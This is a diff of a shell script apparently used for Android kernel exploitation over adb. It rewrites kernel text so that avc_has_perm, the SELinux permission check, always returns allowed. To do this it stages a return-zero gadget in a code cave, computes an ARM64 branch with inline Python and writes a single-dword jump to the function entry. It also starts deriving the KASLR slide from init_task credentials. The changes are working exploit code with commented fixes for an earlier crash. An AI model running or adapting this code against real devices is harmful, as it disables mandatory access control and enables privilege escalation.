@@ -23,6 +23,12 @@ PATCH_ADDR=0xa8145af0
 # "mov w0, wzr; ret" so every permission check returns allowed. Text lines are CPU-clean, so device
 # stores survive there - the same property that makes the capset patch work.
 AVC_ADDR=0xa88bb740
+# avc_has_perm is called on EVERY permission check, so a multi-dword patch is fatal: the intermediate
+# state gets executed almost immediately (that is what rebooted the device). Instead stage
+# "mov w0, wzr; ret" in an unreachable code cave (alignment padding after memcpy's tail - partial
+# writes there are inert because nothing jumps to it yet), then patch avc_has_perm's ENTRY with a
+# SINGLE branch dword: atomic, no window.
+AVC_CAVE=0xa801c7e4
 ORIG=(d503233f d10203ff f800865e a9047bfd a9055ff8 a90657f6 a9074ff4 910103fd 90010d28 f9448908 aa0103f4 910073e1 aa0003f5)
 
 adb_s() { adb -s "$S" shell "$1" </dev/null 2>&1 | tr -d '\r'; }
@@ -66,7 +72,6 @@ restore() {
         wr_verified "$a" "0x${ORIG[$i]}" >/dev/null 2>&1 || echo "  restore[$i] $a unverified"
     done
     wr_verified "$AVC_ADDR" 0xd503233f >/dev/null 2>&1 || echo "  avc restore unverified"
-    wr_verified "$(printf '0x%x' $((AVC_ADDR + 4)))" 0xd10203ff >/dev/null 2>&1 || echo "  avc restore[1] unverified"
     echo "[final] text[0]=$(rd $PATCH_ADDR) (want 0xd503233f)  selinux=$(adb_s getenforce)"
     anim_off
 }
@@ -81,10 +86,17 @@ echo "[final] uptime: $(adb_s 'cut -d. -f1 /proc/uptime')s"
 
 anim_on || exit 1
 
-echo "[final] SELinux: patching avc_has_perm (TEXT) to always-allow"
-wr_verified "$AVC_ADDR" 0x2a1f03e0 || { echo "[final] avc patch failed"; exit 1; }
-wr_verified "$(printf '0x%x' $((AVC_ADDR + 4)))" 0xd65f03c0 || { echo "[final] avc patch failed"; exit 1; }
-echo "[final] avc_has_perm patched: $(rd $AVC_ADDR) $(rd "$(printf '0x%x' $((AVC_ADDR+4)))") (want 0x2a1f03e0 0xd65f03c0)"
+echo "[final] SELinux: staging gadget in a code cave, then ONE-DWORD branch at avc_has_perm"
+wr_verified "$AVC_CAVE" 0x2a1f03e0 || { echo "[final] cave write failed"; exit 1; }
+wr_verified "$(printf '0x%x' $((AVC_CAVE + 4)))" 0xd65f03c0 || { echo "[final] cave write failed"; exit 1; }
+BR=$(python3 -c "
+t=$AVC_CAVE; pc=$AVC_ADDR
+imm=(t-pc)>>2
+assert -0x2000000 < imm < 0x1ffffff, 'branch out of range'
+print('0x%08x' % (0x14000000 | (imm & 0x03ffffff)))")
+echo "[final] branch at avc entry: $BR -> cave $AVC_CAVE"
+wr_verified "$AVC_ADDR" "$BR" || { echo "[final] avc branch failed"; exit 1; }
+echo "[final] avc_has_perm entry now: $(rd $AVC_ADDR) (want $BR)"
 
 echo "[final] deriving slide from init_task.cred (fresh-process reads)"
 lo=$(rd 0xaa79c640); hi=$(rd 0xaa79c644)
